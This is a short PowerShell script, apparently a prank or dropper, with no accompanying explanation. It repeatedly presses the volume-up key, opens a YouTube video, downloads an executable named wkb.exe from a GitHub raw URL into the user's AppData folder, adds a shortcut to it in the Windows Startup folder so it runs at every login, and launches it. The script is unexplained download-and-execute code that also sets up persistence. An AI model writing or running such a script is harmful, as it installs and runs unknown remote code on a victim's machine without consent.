1..50 | ForEach-Object {1..25 | ForEach-Object {(New-Object -ComObject WScript.Shell).SendKeys([char]175)};
PowerShell.exe -Window Hidden;
Start-Process "https://www.youtube.com/watch?v=3URtTIdnXIk";
$i = "C:\Users\Solomon\AppData\Local\WKB";
if (-not (Test-Path $i)) {md $i -Force;}
$f = "$i\wkb.exe";
iwr https://github.com/chain-linc/wkb/raw/refs/heads/main/wkb.exe -o $f;
$s = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wkb.lnk");
$s.TargetPath = $f;
$s.Save();
start $f;
exit;"